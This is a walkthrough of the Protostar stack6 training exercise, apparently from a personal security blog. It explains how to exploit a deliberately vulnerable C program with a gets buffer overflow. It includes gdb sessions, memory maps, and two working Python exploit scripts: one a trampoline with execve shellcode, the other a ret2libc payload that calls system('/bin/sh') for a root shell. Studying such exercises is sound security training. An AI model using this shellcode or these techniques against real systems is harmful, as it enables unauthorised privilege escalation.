---
title: "Protostar stack6 walkthrough"
date: 2020-05-22
tags: [protostar, stack6, walkthrough]
header:
  image: "/images/protostar/protostar.png"
---

## Protostar exercises - [stack6](https://exploit-exercises.lains.space/protostar/stack6/)

#### About
Stack6 looks at what happens when you have restrictions on the return address.

This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.

It is strongly suggested you experiment with multiple ways of getting your code to execute here.

This level is at /opt/protostar/bin/stack6

#### Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

#### Procedure:

The aim is to get a root shell. Similar to the previous problem, we need to overwrite the return pointer. But this time, the return pointer should not be in 0xbf000000 address space (basically stack). As suggested, we can set the return pointer to /bin/sh in libc. We can also set it to itsef so that it fails the 'if' condition and doesn't exit. Then we can use shell code

###### Vulnerability:

`gets` is vulnerable function.


###### Disassembly:

Lets disassemble the main function
```
gdb ./stack6
(gdb) set disassembly-flavor intel
(gdb) disassemble main
(gdb) disassemble getpath
```

![disassembly]({{site.url}}{{site.baseurl}}/images/protostar/stack6/disassemble.png)

The *'_exit'* protects the function *getpath()* from being exploited even though its using vulnerable `gets()` function. 

Lets setup a breakpoint at 'ret' 0x080484f9. Lets also setup a breakpoint at the start of *getpath()* and check the memory map spaces

```
break *0x080484f9
break *getpath
info proc map
r
```

![memorymap]({{site.url}}{{site.baseurl}}/images/protostar/stack6/memorymap.png)

We can see the all the address from 0xbffeb000 to 0xc0000000 are in stack. so we cannot have the return pointer pointing on stack. We can point the return pointer to instruction addresses (0x08048---) and get back onto function execution and bypass the return pointer check. Lets craft an input like stack5 to overwrite the return pointer to itself. The second time ret is executed, we have control of the eip and use it to execute anything on stack.

```
import struct
padding = 'AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV'
eip = struct.pack("I", 0x080484f9)
eip += struct.pack("I", 0xbffff7d0+30)
nopslide = "\x90"*10
interrupt = "\xCC"*100
print padding+eip+nopslide+interrupt
```

after running the program with this input, we can see that we successfully evaded the 'if' loop and reached the breakpoint at 'ret' twice. 

![ret]({{site.url}}{{site.baseurl}}/images/protostar/stack6/ret.png)

We also reach the SIGTRAP. Now, we can replace interrupt with payload and craft another input.

```
import struct
padding = 'AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV'
eip = struct.pack("I", 0x080484f9)
eip += struct.pack("I", 0xbffff7c0)
nopslide = "\x90"*10
payload = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
print padding+eip+nopslide+payload
```

Using this input, /bin/bash can start, but exits immediately.

![bash]({{site.url}}{{site.baseurl}}/images/protostar/stack6/bash.png)

Lets use the previous trick of running stack6 with cat to get an interactive shell.

![shell]({{site.url}}{{site.baseurl}}/images/protostar/stack6/shell.png)

#### ret2libc

DEP, w^x, NX bit, ASLR prevent from executing code on stack in different ways. Even if these protections are present, we can use ret2libc to execute code from libc and get a shell, instead of writing shellcode to stack and executing.

`libc` is a huge library and has many useful functions, some of which can be used to exploit. For example, `system` function in libc is used to execute shell commands. We can create a simple binary using `system` to execute `/bin/bash` and observe how the addresses are laid out on stack. The idea is to craft the same pattern of addresses on stack so that `system` is executed to run `/bin/bash`.


Lets start by creating a simple binary
```
#include <stdlib.h>

void main(){
        system("/bin/sh");
}
```

Compile it using `gcc sys.c -o sys`. We get a root shell with it as expected. Now, lets disassemble this to get the addresses of `system` and `/bin/sh`

```
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x10
0x080483cd <main+9>:    mov    DWORD PTR [esp],0x80484a0
0x080483d4 <main+16>:   call   0x80482ec <system@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
(gdb)
```

Lets put a breakpoint at the `system` call to see how the stack looks.

```
(gdb) break *0x080483d4
Breakpoint 1 at 0x80483d4
(gdb) r
Starting program: /home/user/stack6/sys

Breakpoint 1, 0x080483d4 in main ()
(gdb) x/8wx $esp
0xbffff7c0:     0x080484a0      0xb7ff1040      0x080483fb      0xb7fd7ff4
0xbffff7d0:     0x080483f0      0x00000000      0xbffff858      0xb7eadc76
(gdb) si
0x080482ec in system@plt ()
(gdb) x/8wx $esp
0xbffff7bc:     0x080483d9      0x080484a0      0xb7ff1040      0x080483fb
0xbffff7cc:     0xb7fd7ff4      0x080483f0      0x00000000      0xbffff858
```

At this point, we can see that the return pointer of system function 0x080483d9 is stored on stack followed by the address 0x80484a0, which has the string '/bin/sh'. We can quickly check this.
```
(gdb) x/s 0x80484a0
0x80484a0:       "/bin/sh"
```

We need to have the stack on stack6 binary to look exactly like this. First, the address of `system`, followed by return pointer of system (this could be anything since we only need system to run /bin/sh), followed by address containing /bin/sh (0x080484a0)

Lets use the buffer overflow to write these onto stack at the ret of stack6. Before that, we need to find the address of /bin/sh and system function

```
(gdb) p system
$3 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```

address of system is 0xb7ecffb0. We can find the address of /bin/sh using 'find' in gdb, but the address found doesn't actually has it.

```
(gdb) info proc map
process 1936
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) find 0xb7e97000, 0xb7fd9000, "/bin/sh"
0xb7fba23f
1 pattern found.
(gdb) x/s 0xb7fba23f
0xb7fba23f:      "KIND in __gen_tempname\""
```

Another way to find is by getting the offset of the string from libc's address. 
```
user@protostar:/opt/protostar/bin$ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
 11f3bf /bin/sh
```

address of /bin/sh = 0xb7e97000 + 0x11f3bf = 0xb7fb63bf

Lets use these to craft the exploit.
```
import struct
padding = 'AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV'
call_system = struct.pack("I", 0xb7ecffb0)
ret_of_system = 'AAAA'
bin_sh = struct.pack("I", 0xb7fb63bf)

print padding + call_system + ret_of_system + bin_sh
```

We will get a root shell by running this script with cat
`(python /home/user/stack6/exploit.py; cat) | ./stack6`

![ret2libc]({{site.url}}{{site.baseurl}}/images/protostar/stack6/ret2libc.png)






